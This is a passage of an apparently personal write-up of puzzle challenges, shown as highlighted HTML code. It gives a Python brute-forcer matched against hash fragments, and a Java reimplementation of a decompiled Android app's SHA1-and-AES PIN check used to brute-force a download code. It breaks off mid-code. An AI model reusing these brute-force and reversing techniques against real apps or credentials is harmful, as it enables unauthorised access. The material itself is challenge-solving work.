        &lt;span style=&#34;color: #f8f8f2&#34;&gt;hashed&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;h&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;hexdigest()&lt;/span&gt;

        &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;hashed[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;24&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;30&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;target[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]:&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;[*] Fifth part is:&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;word&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt;


&lt;span style=&#34;color: #f8f8f2&#34;&gt;my_chars&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;string&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;printable&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;target&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;757c47&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;9895d6&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;845b2b&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;0530cd&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;9a2b11&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;which_part&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;sys&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;gen&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;itertools&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;combinations_with_replacement(my_chars,&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;
&lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;[+] Here we go....&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;which_part&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;which_part&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;part_1()&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;which_part&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;2&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;part_2()&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;which_part&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;3&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;part_3()&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;which_part&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;4&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;part_4()&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;which_part&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;5&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;part_5()&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;[+] Finished&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h1 id=&#34;challenge-25:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 25&lt;/h1&gt;

&lt;p&gt;Not solved.&lt;/p&gt;

&lt;h1 id=&#34;challenge-26:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 26&lt;/h1&gt;

&lt;p&gt;I saw no really easy way to do this other than taking apart the apk and
using &lt;code&gt;dex2jar&lt;/code&gt; on the main java file. In this file I found the code
that makes use of the PIN and reversed engineered the code. There&amp;rsquo;s
some hashing and ultimately the app will download the egg.&lt;/p&gt;

&lt;p&gt;So I reimplemented the Java code and bruteforced it. A few numbers matched,
so I just entered them until I got a valid download:
(disclaimer: I am not very good at Java at all)&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;java.io.File&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;java.io.FileOutputStream&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;java.security.MessageDigest&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;java.security.SecureRandom&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;java.util.regex.Matcher&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;java.util.regex.Pattern&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;java.security.*&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #75715e&#34;&gt;//MessageDigest;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;javax.crypto.*&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;javax.crypto.spec.*&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;javax.crypto.spec.SecretKeySpec&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;java.awt.Graphics&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;java.util.Arrays&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;java.awt.image.BufferedImage&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;java.nio.file.Files&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;java.nio.file.Paths&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;java.io.ByteArrayInputStream&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;java.security.*&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #75715e&#34;&gt;//MessageDigest;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;javax.crypto.*&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;javax.crypto.spec.*&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;javax.imageio.ImageIO&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;javax.swing.JFrame&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;javax.swing.JPanel&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;java.io.File&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;sun.misc.BASE64Decoder&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;sun.misc.BASE64Encoder&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;HelloWorld&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;[]&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;do_sha&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;String&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;s&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;String&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;s1&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;i1&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;throws&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;NoSuchAlgorithmException&lt;/span&gt;
    &lt;span style=&#34;color: #f92672&#34;&gt;{&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;MessageDigest&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;messagedigest&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;MessageDigest&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;getInstance&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;SHA1&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;byte&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;abyte0&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;[]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;StringBuilder&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;String&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;valueOf&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;s1&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;))).&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;append&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;s&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;).&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;toString&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;getBytes&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;();&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;j1&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;do&lt;/span&gt;
        &lt;span style=&#34;color: #f92672&#34;&gt;{&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;j1&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;i1&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt;
            &lt;span style=&#34;color: #f92672&#34;&gt;{&lt;/span&gt;
                &lt;span style=&#34;color: #66d9ef&#34;&gt;byte&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;abyte1&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;[]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;16&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;];&lt;/span&gt;
                &lt;span style=&#34;color: #f8f8f2&#34;&gt;System&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;arraycopy&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;abyte0&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;abyte1&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;15&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;);&lt;/span&gt;
                &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;abyte1&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
            &lt;span style=&#34;color: #f92672&#34;&gt;}&lt;/span&gt;
            &lt;span style=&#34;color: #f8f8f2&#34;&gt;abyte0&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;messagedigest&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;digest&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;abyte0&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;);&lt;/span&gt;
            &lt;span style=&#34;color: #f8f8f2&#34;&gt;j1&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;++;&lt;/span&gt;
        &lt;span style=&#34;color: #f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;while&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;true&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color: #f92672&#34;&gt;}&lt;/span&gt;

    &lt;span style=&#34;color: #66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;String&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;hardwork&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;String&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;s&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt;
    &lt;span style=&#34;color: #f92672&#34;&gt;{&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;String&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;s1&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;String&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;();&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;try&lt;/span&gt;
        &lt;span style=&#34;color: #f92672&#34;&gt;{&lt;/span&gt;
            &lt;span style=&#34;color: #f8f8f2&#34;&gt;Cipher&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;cipher&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;Cipher&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;getInstance&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;AES&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;);&lt;/span&gt;
            &lt;span style=&#34;color: #f8f8f2&#34;&gt;SecretKeySpec&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;secretkeyspec&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;SecretKeySpec&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;do_sha&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;s&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;ovaederecumsale&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;10000&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;),&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;AES&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;);&lt;/span&gt;
            &lt;span style=&#34;color: #f8f8f2&#34;&gt;cipher&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;init&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;secretkeyspec&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;);&lt;/span&gt;
            &lt;span style=&#34;color: #f8f8f2&#34;&gt;BASE64Decoder&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;decoder&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;BASE64Decoder&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;();&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;[]&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;decodedBytes&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;decoder&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;decodeBuffer&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;8QeNdEdkspV6+1I77SEEEF4aWs5dl/auahJ46MMufkg=&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;);&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;[]&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;plaintxt&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;cipher&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;doFinal&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;decodedBytes&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;);&lt;/span&gt;
            &lt;span style=&#34;color: #f8f8f2&#34;&gt;BASE64Encoder&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;encoder&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;BASE64Encoder&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;();&lt;/span&gt;
